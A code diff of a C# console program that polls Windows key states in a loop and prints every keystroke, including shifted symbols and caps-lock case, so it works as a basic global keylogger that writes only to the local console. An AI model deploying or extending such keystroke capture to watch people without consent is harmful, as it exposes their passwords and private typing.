@@ -1,7 +1,7 @@
 ﻿using System;
 using System.Runtime.InteropServices;
 
-namespace ConsoleApp1
+namespace Pudge
 {
     class Program
     {
@@ -13,37 +13,18 @@ namespace ConsoleApp1
 
         static void Main(string[] args)
         {
-            bool shiftIsPressed = false;
+            bool isShiftPressed = false;
 
             while (true)
             {
-                for (int i = 0; i < 255; i++)
+                for (int i = 8; i < 223; i++)
                 {
-                    int keyState = GetAsyncKeyState(i);
-
-                    if (keyState == 32769)
+                    if (GetAsyncKeyState(i) == 32769)
                     {
-                        if (GetKeyState(0x10) != 65408 && GetKeyState(0x10) != 65409)
-                            shiftIsPressed = false;
-
-                        if (GetKeyState(0x10) == 65408 || GetKeyState(0x10) == 65409)
+                        if (GetKeyState(16) == 65408 || GetKeyState(16) == 65409)   //Shift
                         {
                             switch (i)
                             {
-                                case 8:
-                                case 9:
-                                case 13:
-                                case 16:                 //extra for Shift
-                                case 17:                 //extra for Ctrl
-                                case 18:                 //extra for Alt
-                                case 20:
-                                case 22:
-                                case 27:
-                                case 32:
-                                case 37:
-                                case 38:
-                                case 39:
-                                case 40: continue;
                                 case 48: Console.Write(") "); break;
                                 case 49: Console.Write("! "); break;
                                 case 50: Console.Write("@ "); break;
@@ -54,25 +35,20 @@ namespace ConsoleApp1
                                 case 55: Console.Write("& "); break;
                                 case 56: Console.Write("* "); break;
                                 case 57: Console.Write("( "); break;
-                                case 91: continue;
                                 case 160:
-                                    if (!shiftIsPressed)
+                                    if (!isShiftPressed)
                                     {
                                         Console.Write("leftShift ");
-                                        shiftIsPressed = true;
+                                        isShiftPressed = true;
                                     }
                                     break;
                                 case 161:
-                                    if (!shiftIsPressed)
+                                    if (!isShiftPressed)
                                     {
                                         Console.Write("rightShift ");
-                                        shiftIsPressed = true;
+                                        isShiftPressed = true;
                                     }
                                     break;
-                                case 162:
-                                case 163:
-                                case 164:
-                                case 165: continue;
                                 case 186: Console.Write(": "); break;
                                 case 187: Console.Write("+ "); break;
                                 case 188: Console.Write("< "); break;
@@ -83,20 +59,31 @@ namespace ConsoleApp1
                                 case 219: Console.Write("{ "); break;
                                 case 220: Console.Write("| "); break;
                                 case 221: Console.Write("} "); break;
-                                case 222: Console.Write("\" "); break;
-                                default: Console.Write((char)i + " "); break;
+                                case 222: Console.Write('"' + " "); break;
+                                default:
+                                    if ((i >= 'A' && i <= 'Z') || (i >= 'a' && i <= 'z') || (i >= '0' && i <= '9'))
+                                    {
+                                        if (Console.CapsLock)
+                                        {
+                                            Console.Write((char)(i + 32) + " ");
+                                        }
+                                        else
+                                        {
+                                            Console.Write((char)i + " ");
+                                        }
+                                    }
+                                    break;
                             }
                         }
                         else
                         {
+                            isShiftPressed = false;
+
                             switch (i)
                             {
                                 case 8: Console.Write("Backspace "); break;
                                 case 9: Console.Write("Tab "); break;
                                 case 13: Console.Write("Enter "); break;
-                                case 16:                 //extra for Shift
-                                case 17:                 //extra for Ctrl
-                                case 18: continue;       //extra for Alt
                                 case 20: Console.Write("CapsLock "); break;
                                 case 22: Console.Write("' "); break;
                                 case 27: Console.Write("Escape "); break;
@@ -122,13 +109,16 @@ namespace ConsoleApp1
                                 case 221: Console.Write("] "); break;
                                 case 222: Console.Write("' "); break;
                                 default:
-                                    if (Console.CapsLock)
+                                    if ((i >= 'A' && i <= 'Z') || (i >= 'a' && i <= 'z') || (i >= '0' && i <= '9'))
                                     {
-                                        Console.Write((char)i + " ");
-                                    }
-                                    else
-                                    {
-                                        Console.Write(toLower((char)i) + " ");
+                                        if (Console.CapsLock || (i >= '0' && i <= '9'))
+                                        {
+                                            Console.Write((char)i + " ");
+                                        }
+                                        else
+                                        {
+                                            Console.Write((char)(i + 32) + " ");
+                                        }
                                     }
                                     break;
                             }
@@ -136,13 +126,6 @@ namespace ConsoleApp1
                     }
                 }
             }
-        }
-
-        static char toLower(char str)
-        {
-            if (str >= 65 && str <= 90)
-                str = (char)(str + 32);
-            return str;
         }
     }
 }
